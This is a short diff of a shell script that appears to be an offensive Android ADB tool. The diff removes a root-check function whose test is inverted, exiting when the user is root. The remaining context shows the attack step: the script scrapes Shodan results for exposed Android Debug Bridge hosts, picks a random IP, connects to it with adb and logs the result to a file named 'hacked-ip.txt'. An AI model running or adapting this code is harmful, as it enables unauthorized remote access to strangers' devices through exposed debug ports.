@@ -57,13 +57,6 @@ U  \ V  V /  U/_/   \_\ |____/ u|____/  |_|    U  \ V  V /  U|_| \_|
 EOF
 }
 
-mustberoot() {
-if [[ $EUID -eq "0" ]]; then
-   printf "* Root privileges is required for $basename$0\n"
-   exit 1
-fi
-}
-
 status() {
 ADBW=$(adb devices | sed -n '2p'|awk '{print $2}' | sed 's/device/normal/g')
 ADBF="$(fastboot devices | grep fastboot|awk '{print $2}')"
@@ -133,7 +126,6 @@ adb shell which su &> /dev/null; if [[ $? = "1" ]]; then echo "This option need 
 
 
 TARGETS="https://www.shodan.io/search?query=android+debug+bridge"
- mustberoot
  status
  banner
  curl -sL $TARGETS|grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b'|shuf -n 1|xargs adb connect > hacked-ip.txt
